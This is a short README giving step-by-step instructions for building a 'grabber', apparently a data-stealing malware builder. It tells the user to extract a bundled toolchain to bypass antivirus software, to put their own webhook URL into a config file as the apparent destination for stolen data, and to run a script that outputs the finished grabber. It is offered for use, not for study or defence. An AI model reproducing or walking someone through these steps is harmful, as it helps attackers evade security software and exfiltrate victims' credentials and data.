Make sure that internet is connected when running for the first time in virtual env to install dependencies!

How to use:-

1) Extract the "mingw64.7z" file in your "C Drive". (TO BYPASS MOST ANTIVIRUSES) (ONE TIME PROCESS)
2) Install virtualenv by using "pip install virtualenv".
3) Open cmd in current dir and type "virtualenv env" and let it complete and close cmd.
4) Open "config.txt" in "Data" folder and replace "WEBHOOK_URL" with your webhook.
5) Copy all the files from "Data" folder to "Scripts" folder in "env" folder. (Do NOT copy the folder itself)
6) Type "run" in the address bar of the "Scripts" folder and wait for the process to complete.
7) When the process complete, a new folder will open containing the grabber.

How to create another grabber in the same virtual env:-

- Edit the "config.txt" file in the "Scripts" folder and follow from the step (6).

SPECIAL NOTE ::::::::: DO NOT EDIT ANYTHING BESIDES "config.txt" OTHERWISE THE PROGRAM WILL NOT WORK!!!! YOU CAN SEE THE CODE BUT DON'T EDIT!!!
